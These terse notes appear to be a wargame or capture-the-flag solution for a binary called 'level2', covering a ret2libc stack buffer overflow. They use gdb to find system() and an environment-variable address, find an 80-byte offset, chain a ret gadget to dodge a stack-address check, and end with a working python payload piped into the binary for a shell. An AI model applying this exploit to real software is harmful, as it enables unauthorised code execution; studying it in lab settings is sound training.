
we find the shell variable with x/1000s $esp-1000 0xbffff908

gdb info function system to get 0xb7e6b060

https://wiremask.eu/tools/buffer-overflow-pattern-generator/ give you pattern to find offset 80

to avoid protection about 0xb00000 in P
add the return address of one ret (main or p return ) 

then the system function then the address of one environnement variable that you set that contain the sh keyword


(python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "dumm" + "\xa3\xff\xff\xbf"' ; cat ) | ./level2

